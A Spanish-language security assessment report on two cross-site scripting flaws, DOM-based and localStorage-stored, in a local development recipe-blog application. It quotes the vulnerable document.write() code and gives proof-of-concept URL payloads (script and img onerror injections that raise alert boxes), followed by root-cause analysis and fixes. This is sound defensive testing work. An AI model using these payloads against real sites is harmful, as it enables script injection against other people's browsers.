# Informe de Análisis de Seguridad – Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  
**Herramientas:** curl, análisis manual de código fuente

---

## 1. Resumen Ejecutivo

Se han identificado **dos vulnerabilidades XSS** en la aplicación web:

1. **DOM-based XSS** en el parámetro `search` (sección de búsqueda de recetas).
2. **Stored XSS** en los parámetros `name` y `comment` (sección de comentarios, persistido en `localStorage`).

Ambas vulnerabilidades son explotables y permiten la inyección y ejecución de código JavaScript arbitrario en el navegador de la víctima.

---

## 2. Descripción de la Aplicación

La aplicación es un "Blog de Recetas" con dos funcionalidades principales:

- **Búsqueda de recetas**: Acepta un parámetro `search` vía GET y muestra los resultados.
- **Sistema de comentarios**: Acepta parámetros `name` y `comment` vía GET, los almacena en `localStorage` y los renderiza en la página.

Toda la lógica de renderizado se realiza en el lado del cliente mediante JavaScript.

---

## 3. Vulnerabilidades Encontradas

### 3.1 DOM-based XSS – Parámetro `search`

**Severidad:** Alta  
**Tipo:** DOM-based XSS (CWE-79)  
**URL vulnerable:** `http://web.dev.local:8082/?search=<PAYLOAD>`

**Descripción:**  
El parámetro `search` es obtenido directamente de `URLSearchParams` y concatenado sin ningún tipo de sanitización en una llamada a `document.write()`:

```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

El valor del parámetro nunca es escapado ni validado antes de insertarse en el DOM, lo que permite inyectar HTML y JavaScript arbitrario.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=</strong><script>alert('XSS-search')</script>
```

**Payload URL-encoded:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cscript%3Ealert%28%27XSS-search%27%29%3C%2Fscript%3E
```

**Impacto:** Cualquier usuario que acceda a una URL manipulada ejecutará código JavaScript en su navegador. Esto puede usarse para robo de cookies de sesión, redirección a sitios maliciosos, phishing, o ejecución de acciones no autorizadas en nombre del usuario.

---

### 3.2 Stored XSS – Parámetros `name` y `comment`

**Severidad:** Alta  
**Tipo:** Stored XSS / DOM-based (CWE-79)  
**URL vulnerable:** `http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>`

**Descripción:**  
Los parámetros `name` y `comment` son tomados directamente de `URLSearchParams` y almacenados en `localStorage` sin ningún saneamiento. Posteriormente, al renderizar los comentarios, el contenido se inserta sin escapar en el DOM mediante `document.write()`:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
// Se almacena tal cual en localStorage
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
// ...
// Se renderiza sin escapar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Payload de explotación – campo `name`:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS-name')>&comment=Hola
```

**Payload de explotación – campo `comment`:**
```
http://web.dev.local:8082/?name=Attacker&comment=<script>alert('XSS-comment')</script>
```

**Impacto:** El payload se persiste en `localStorage` y se ejecuta cada vez que el usuario afectado carga la página. Aunque la persistencia es local (no se comparte entre usuarios), este vector puede combinarse con ataques de ingeniería social o si el atacante consigue acceso físico/remoto al navegador de la víctima. Además, permite demostrar la ausencia total de controles de seguridad en el manejo de entradas.

---

## 4. Prueba de Concepto (PoC)

### PoC 1 – DOM-based XSS en búsqueda

Al navegar a la siguiente URL, el navegador ejecuta `alert('XSS-search')`:

```
http://web.dev.local:8082/?search=</strong><script>alert('XSS-search')</script>
```

El flujo de ejecución:
1. JavaScript obtiene `searchTerm = "</strong><script>alert('XSS-search')</script>"` del parámetro URL.
2. Se llama a `document.write(...)` con el valor sin escapar.
3. El navegador interpreta el HTML inyectado y ejecuta el script.

### PoC 2 – Stored XSS en comentarios

Al navegar a la siguiente URL, el payload queda almacenado en `localStorage`:

```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror=alert('XSS-stored')>
```

Flujo de ejecución:
1. El parámetro `comment` se guarda en `localStorage` sin sanitización.
2. En cada carga de página, `displayComments()` itera sobre los comentarios almacenados.
3. El contenido se inserta vía `document.write()` sin escapar, ejecutando el payload.
4. La víctima verá el alert cada vez que recargue la página hasta que limpie los comentarios.

---

## 5. Causa Raíz

- **Ausencia de sanitización/escapado**: Ningún valor de entrada (parámetros GET) es escapado antes de insertarse en el DOM.
- **Uso inseguro de `document.write()`**: Esta función interpreta el HTML directamente, haciendo trivial la inyección de etiquetas y scripts.
- **Sin Content Security Policy (CSP)**: No se observa ningún header CSP que pudiera mitigar la ejecución de scripts inline.

---

## 6. Recomendaciones

1. **Escapar todas las entradas de usuario** antes de insertarlas en el DOM. Usar `textContent` en lugar de `innerHTML`/`document.write()`, o la función `encodeURIComponent` / `DOMPurify` para sanear HTML.

   ```javascript
   // Inseguro:
   document.write('<p>' + searchTerm + '</p>');
   
   // Seguro:
   const p = document.createElement('p');
   p.textContent = searchTerm;
   document.getElementById('results').appendChild(p);
   ```

2. **Implementar Content Security Policy (CSP)**: Añadir un header CSP restrictivo que impida la ejecución de scripts inline.

3. **Validar entradas en el servidor**: Aunque la lógica es cliente-side, cualquier dato que se persista o procese debe validarse.

4. **Evitar `document.write()`**: Esta función es inherentemente insegura para contenido dinámico; usar manipulación segura del DOM.

5. **Sanitizar datos antes de almacenarlos en `localStorage`**: Usar librerías como `DOMPurify` para limpiar el HTML antes de guardar o renderizar comentarios.

---

## 7. Conclusión

La aplicación http://web.dev.local:8082 presenta vulnerabilidades XSS críticas en dos puntos de entrada: el buscador de recetas (DOM-based XSS) y el sistema de comentarios (Stored XSS). Ambas vulnerabilidades son explotables con payloads simples y sin autenticación previa. Se recomienda aplicar las correcciones indicadas con carácter urgente.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
